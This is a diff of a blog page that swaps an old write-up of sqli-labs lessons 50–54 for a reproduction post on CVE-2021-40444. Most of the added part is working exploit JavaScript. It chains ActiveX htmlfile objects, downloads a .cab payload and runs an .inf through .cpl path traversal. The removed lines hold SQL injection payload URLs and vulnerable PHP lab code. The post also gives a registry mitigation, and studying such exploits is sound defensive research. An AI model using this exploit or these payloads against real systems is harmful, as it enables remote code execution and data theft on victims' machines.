+                iframe[&#39;contentDocument&#39;][&#39;open&#39;]()[&#39;close&#39;](); //没有意义
+                try {
+                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;body&#39;], iframe); //删除iframe标签
+                } catch (_0x3b004e) {
+                    window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;removeChild&quot;][&#39;call&#39;](window[&quot;document&quot;][&#39;documentElement&#39;], iframe);
                 }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-    else
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        print_r(mysqli_error($con1));
-        echo &quot;&lt;/font&gt;&quot;;  
-    }
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-51.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
+                htmlfile2[&#39;open&#39;]()[&#39;close&#39;](); //没有意义
+                var htmlfile3 = new htmlfile2[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);
+                htmlfile3[&#39;open&#39;]()[&#39;close&#39;]();
+                var htmlfile4 = new htmlfile3[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);
+                htmlfile4[&#39;open&#39;]()[&#39;close&#39;]();
+                var htmlfile5 = new htmlfile4[(&#39;Script&#39;)][&#39;ActiveXObject&#39;](&#39;htmlfile&#39;);
+                htmlfile5[&#39;open&#39;]()[&#39;close&#39;]();
+                var ActiveXObjectVAR = new ActiveXObject(&#39;htmlfile&#39;)
+                  , ActiveXObjectVAR2 = new ActiveXObject(&#39;htmlfile&#39;)
+                  , ActiveXObjectVAR3 = new ActiveXObject(&#39;htmlfile&#39;)
+                  , ActiveXObjectVAR4 = new ActiveXObject(&#39;htmlfile&#39;)
+                  , ActiveXObjectVAR5 = new ActiveXObject(&#39;htmlfile&#39;)
+                  , ActiveXObjectVAR6 = new ActiveXObject(&#39;htmlfile&#39;)
+                  , XMLHttpR = new window[&#39;XMLHttpRequest&#39;]()
+                  , XMLHttpRopen = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;open&#39;]
+                  , XMLHttpRsend = window[&#39;XMLHttpRequest&#39;][&#39;prototype&#39;][&#39;send&#39;];
+                XMLHttpRopen[&#39;call&#39;](XMLHttpR, &#39;GET&#39;, &#39;http://127.0.0.1/test.cab&#39;, ![]), //构造请求远程端的test.cab链接
+                XMLHttpRsend[&#39;call&#39;](XMLHttpR), //发送请求
+                htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;write&#39;](&#39;body&gt;&#39;);
+                var htmlScript = window[&quot;Document&quot;][&#39;prototype&#39;][&#39;createElement&#39;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;], &#39;object&#39;); //创建Scriptobject
+                //下面这两步将会让IE自动请求远程的cab然后自动解压
+                htmlScript[&#39;setAttribute&#39;](&#39;codebase&#39;, &#39;http://127.0.0.1/test.cab#version=5,0,0,0&#39;); //设定codebase属性值
+                htmlScript[&#39;setAttribute&#39;](&#39;CLSID:edbc374c-5730-432a-b5b8-de94f0b57217&#39;), //设置CLSID
+                window[&quot;HTMLElement&quot;][&quot;prototype&quot;][&quot;appendChild&quot;][&#39;call&#39;](htmlfile5[&#39;Script&#39;][&#39;document&#39;][&#39;body&#39;], htmlScript), //将scriptobject添加到body
+                //逐个尝试用cpl从对应的路径中执行championship.inf文件（盲猜路径执行，总有一个能成）
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:123&#39;,
+                ActiveXObjectVAR[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/Low/championship.inf&#39;,
+                ActiveXObjectVAR2[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../AppData/Local/Temp/championship.inf&#39;,
+                ActiveXObjectVAR3[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/Low/championship.inf&#39;,
+                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../AppData/Local/Temp/championship.inf&#39;,
+                ActiveXObjectVAR5[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/Low/championship.inf&#39;,
+                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../../../../Temp/championship.inf&#39;,
+                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../Low/championship.inf&#39;,
+                ActiveXObjectVAR4[&#39;Script&#39;][&#39;location&#39;] = &#39;.cpl:../../championship.inf&#39;; //设置cpl执行championship.inf
+            }());
+        &lt;/script&gt;
+    &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<p>多了个需要闭合还是报错注入带走</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-51/?sort=1%27%20and%20updatexml(1,concat(0x7e,(select%20user()),0x7e),1)%20--+
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kBzv1f.png" alt="kBzv1f.png"></p>
-<p>52关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql)) /*查询*/
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
-                }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-53.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>没有输出mysql报错，盲注带走</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-52/?sort=rand(length(database())=8)
-</code></pre><p><img src="https://s2.ax1x.com/2019/02/14/kDSkhq.md.png" alt="kDSkhq.md.png"></p>
-<p>53关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;ORDER BY Clause Blind based&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
-
-&lt;?php
-include(&quot;../sql-connections/sqli-connect.php&quot;);
-error_reporting(0);
-$id=$_GET[&#39;sort&#39;];    
-if(isset($id))
-{
-    //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;SORT:&#39;.$id.&quot;\n&quot;);
-    fclose($fp);
-
-    $sql=&quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;
-    /* execute multi query */
-    if (mysqli_multi_query($con1, $sql)) /*查询*/
-    {
-
-        ?&gt;
-        &lt;center&gt;
-        &lt;font color= &quot;#00FF00&quot; size=&quot;4&quot;&gt;
-
-        &lt;table   border=1&#39;&gt;
-        &lt;tr&gt;
-            &lt;th&gt;&amp;nbsp;ID&amp;nbsp;&lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;
-            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;/font&gt;
-        &lt;/font&gt;
-        &lt;?php
-            /* store first result set */
-            if ($result = mysqli_store_result($con1))
-            {
-                while($row = mysqli_fetch_row($result))
-                {
-                    echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;        
-                    echo &quot;&lt;tr&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[0]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[1]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;td&gt;&quot;;
-                    printf(&quot;%s&quot;, $row[2]);
-                    echo &quot;&lt;/td&gt;&quot;;
-                    echo &quot;&lt;/tr&gt;&quot;;
-                    echo &quot;&lt;/font&gt;&quot;;
-
-                }
-
-            }
-    echo &quot;&lt;/table&gt;&quot;;
-    }
-
-}
-else
-{
-    echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-    echo &#39;&lt;img src=&quot;../images/Less-53.jpg&quot; /&gt;&lt;br&gt;&#39;;    
-}
-?&gt;
-&lt;/font&gt; 
-&lt;/div&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-&lt;/br&gt;
-
-&lt;/center&gt; 
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>回显不正常只能延时注入，由于延时注入从图片中看不出效果这里就不放了</p>
-<pre><code>http://127.0.0.1/sqli-labs-master/Less-53/?sort=1%27%20and%20sleep(if((length(dataabse())=8),1,4))%20--+
-</code></pre><p>54关代码：</p>
-<pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-&lt;title&gt;Less-54:Challenge-1&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body bgcolor=&quot;#000000&quot;&gt;
-&lt;div style =&quot;text-align:right&quot;&gt;
-&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
-&lt;input  type=&quot;submit&quot; name=&quot;reset&quot; value=&quot;Reset the Challenge!&quot; /&gt;
-&lt;/form&gt;
-&lt;/div&gt;
-&lt;/right&gt;
-&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
-&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;
+<p>调用XMLHttpRequest请求cab文件后 ,将自动解压到Temp目录，最后用cpl执行<br><img src="https://z3.ax1x.com/2021/09/13/4P2Ya6.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2dRe.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P2wxH.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4P26dP.png" alt=""></p>
+<p>参考链接:<a href="https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html" target="_blank" rel="noopener">https://www.cnblogs.com/qguohog/archive/2013/01/25/2876828.html</a></p>
+<p>动态执行分析如下：<br>-&gt;远程请求发起<br>-&gt;mshtml.dll解析js里的内容<br>-&gt;然后下载cab文件<br>-&gt;从IE的TEMP目录找到临时的cab文件解压到C:\Users\<username>\AppData\Local\Temp<br>-&gt;最后control.exe将调用inf<br><img src="https://z3.ax1x.com/2021/09/13/4P2vQJ.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR9dx.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/13/4PR1fS.png" alt=""></username></p>
+<p>复现GIF<br><img src="https://z3.ax1x.com/2021/09/13/4PRGlQ.gif" alt=""></p>
+<p>修复方案：<br>这会将 64 位和 32 位进程的所有 Internet 区域的 URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和 URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为 DISABLED (3)。不会安装新的 ActiveX 控件。以前安装的 ActiveX 控件将继续运行。</p>
+<p>如何撤消解决方法<br>将策略中的选项设置为Enable。<br>要通过 regkey 在单个系统上禁用 ActiveX 控件：<br>警告如果注册表编辑器使用不当，可能会导致严重的问题，可能需要重新安装操作系统。Microsoft 不能保证您可以解决因注册表编辑器使用不当而导致的问题。使用注册表编辑器风险自负。</p>
+<p>要禁止在 Internet Explorer 中的所有区域安装 ActiveX 控件，请将以下内容粘贴到文本文件中并使用 .reg 文件扩展名保存：</p>
+<pre><code>Windows Registry Editor Version 5.00
 
 
-
-&lt;?php
-//including the Mysql connect parameters.
-include &#39;../sql-connections/sql-connect-1.php&#39;;
-include &#39;../sql-connections/functions.php&#39;;
-error_reporting(0);
-$pag = $_SERVER[&#39;PHP_SELF&#39;]; //generating page address to piggy back after redirects... /*获取当前php的路径*/
-$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; //characterset for generating random data /*用于生成随机数据的字符集*/
-$times= 10;
-$table = table_name();
-$col = column_name(1);     // session id column name
-$col1 = column_name(2);   //secret key column name
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]
+&quot;1001&quot;=dword:00000003
+&quot;1004&quot;=dword:00000003
 
 
-// Submitting the final answer
-if(!isset($_POST[&#39;answer_key&#39;])) /*判断answer_key如果否存在，如果不存在则执行以下操作*/
-{
-    // resetting the challenge and repopulating the table .
-    if(isset($_POST[&#39;reset&#39;])) /*如果POST的传参reset存在*/
-    {
-        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000); /*设置一个cookie然后跳转*/
-        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;
-        echo &quot;Redirecting you to main challenge page..........\n&quot;;
-        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; ); /*重定向到主页*/
-        //echo &quot;cookie expired&quot;;
-
-    }
-    else
-    {
-        // Checking the cookie on the page and populate the table with random value.
-        if(isset($_COOKIE[&#39;challenge&#39;])) /*判断是否有cookie存在*/
-        {
-            $sessid=$_COOKIE[&#39;challenge&#39;];
-            //echo &quot;Cookie value: &quot;.$sessid;
-        }
-        else
-        {
-            $expire = time()+60*60*24*30;
-            $hash = data($table,$col);
-            setcookie(&quot;challenge&quot;, $hash, $expire); /*如果是第一次访问给予一个cookie*/
-
-        }
-
-        echo &quot;&lt;br&gt;\n&quot;;
-
-        // take the variables
-        if(isset($_GET[&#39;id&#39;])) /*判断是否有GET传参ID的存在*/
-        {
-            $id=$_GET[&#39;id&#39;];
-
-            //logging the connection parameters to a file for analysis.
-            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
-            fclose($fp);
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]
+&quot;1001&quot;=dword:00000003
+&quot;1004&quot;=dword:00000003
 
 
-            //update the counter in database
-            next_tryy();
-
-            //Display attempts on screen.
-            $tryyy = view_attempts();
-            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;
-            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
+&quot;1001&quot;=dword:00000003
+&quot;1004&quot;=dword:00000003
 
 
-            //Reset the Database if you exceed allowed attempts.
-            if($tryyy &gt;= ($times+1))
-            {
-                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);
-                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;
-                echo &quot;Redirecting you to challenge page..........\n&quot;;
-                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );
-                echo &quot;&lt;br&gt;\n&quot;;
-            }    
-
-
-
-            // Querry DB to get the correct output
-            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
-            $result=mysql_query($sql);
-            $row = mysql_fetch_array($result);
-
-            if($row)
-            {
-                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;    
-                echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-                echo &quot;&lt;br&gt;&quot;;
-                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-                echo &quot;&lt;/font&gt;&quot;;
-            }
-            else 
-            {
-                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-//                print_r(mysql_error());
-                echo &quot;&lt;/font&gt;&quot;;  
-            }
-        }
-        else
-        {
-            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;
-            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;
-            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;
-        }
-
-    }
-
-
-?&gt;
-&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
-&lt;img src=&quot;../images/Less-54.jpg&quot; /&gt;
-&lt;/center&gt;
-&lt;br&gt;&lt;br&gt;&lt;br&gt;
-&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;
-&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
-Submit Secret Key: &lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;
-&lt;input type=&quot;submit&quot; name = &quot;answer_key&quot; value=&quot;Submit&quot;&gt;
-&lt;/form&gt; 
-&lt;/div&gt;
-
-
-&lt;?php
-
-}
-
-else
-{
-    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;
-    $key = addslashes($_POST[&#39;key&#39;]); /*处理特殊字符*/
-    $key = mysql_real_escape_string($key);
-    //echo $key;
-    //Query table to verify your result
-    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;
-    //echo &quot;$sql&quot;;
-    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());
-
-    $row = mysql_fetch_array($result);
-
-    if($row)
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;
-        echo &quot;&lt;/font&gt;&quot;; 
-        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );    
-    }
-    else 
-    {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;
-        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;
-        header( &quot;refresh:3;url=index.php&quot; );
-        //print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
-            }    
-
-
-}
-
-?&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-<p>要求你注入获取到key，数据库不在是security,限制注入次数为10次，如果超过此次数，重定向到主页，并且每次的密码都是随机的。虽然如此，但是这是通过cookie来判断你的次数，你可以修改你cookie或者更换IP和浏览器来进行多次试验<br>PS:给出数据库名：challenges<br><img src="https://s2.ax1x.com/2019/02/14/kDP6ij.png" alt="kDP6ij.png"></p>
-<pre><code>payload:
-http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+
-http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%22v1icuozblo%22%20--+
-http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_concat(secret_J0N4,tryy),3%20from%20v1icuozblo%20--+
-</code></pre><p>最终得到随机密码是：J7oVFGp7S8WSd5Nb1xLBK7uF11</p>
-<p>转载请声明：转自422926799.github.io</p>
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]
+&quot;1001&quot;=dword:00000003
+&quot;1004&quot;=dword:00000003
+</code></pre><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444" target="_blank" rel="noopener">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2501,12 +2062,12 @@ http://127.0.0.1/sqli-labs-master/Less-54/?id=0%27%20union%20select%201,group_co
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>sqli labs Less 50 -&gt; Less 54</p>
+    <p><span class="copy-title">文章标题:</span>CVE-2021-40444漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-02-14, 18:37:41</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/b0e668d5.html" title="sqli labs Less 50 -&gt; Less 54">http://422926799.github.io/posts/b0e668d5.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-09-13, 16:25:37</p>
+    <p><span class="copy-title">最后更新:</span>2021-09-13, 16:46:05</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3e27999a.html" title="CVE-2021-40444漏洞复现">http://422926799.github.io/posts/3e27999a.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
